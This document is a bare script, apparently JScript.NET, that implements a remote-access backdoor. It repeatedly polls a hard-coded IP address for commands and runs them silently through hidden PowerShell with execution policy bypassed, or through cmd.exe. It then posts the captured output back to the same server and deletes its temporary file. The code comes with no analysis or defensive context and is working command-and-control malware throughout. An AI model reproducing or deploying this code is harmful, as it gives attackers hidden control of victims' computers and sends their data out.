class Homa {
static function httppost(content, key) {
   try
   {
		var objHTTP = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
		var url = "http://185.205.187.109:8000/X" + key;
		var data = content + "()" + key;
		objHTTP.Open("POST", url, false);
		objHTTP.Send(data);
		var res = objHTTP.responseText;
		res = res.slice(1, -1);
		return res;
   }
   catch (e) { return ""; }
}

static function ex(cmd) {
	var sh = new ActiveXObject("WScript.Shell");
	var out = "C:\\Users\\Public\\outputt2.txt";
	if (cmd.indexOf("function") == 0) {
		sh.Run("powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"" + cmd + "\" > " + out, 0, true);
	} else if (cmd.indexOf("ssh") == 0) {
		sh.Run("cmd.exe /c " + cmd, 0, false);
		return "";
	} else {
		sh.Run("cmd.exe /c " + cmd + " > " + out, 0, true);
	}
	var fso = new ActiveXObject("Scripting.FileSystemObject");
	var f = fso.OpenTextFile(out, 1);
	var result = f.ReadAll();
	f.Close();
	fso.DeleteFile(out);
	return result;
}

static function run() {
	var key = "a1B2c";
	var result = "";
	while(true)
	{
		var cmd = httppost("hi", key);
		if (cmd.length > 2) {
			result = ex(cmd);
		}
		if(result.length > 2) {
			result = httppost(result, key);
		}
		WScript.Sleep(10000);
	}
}
}
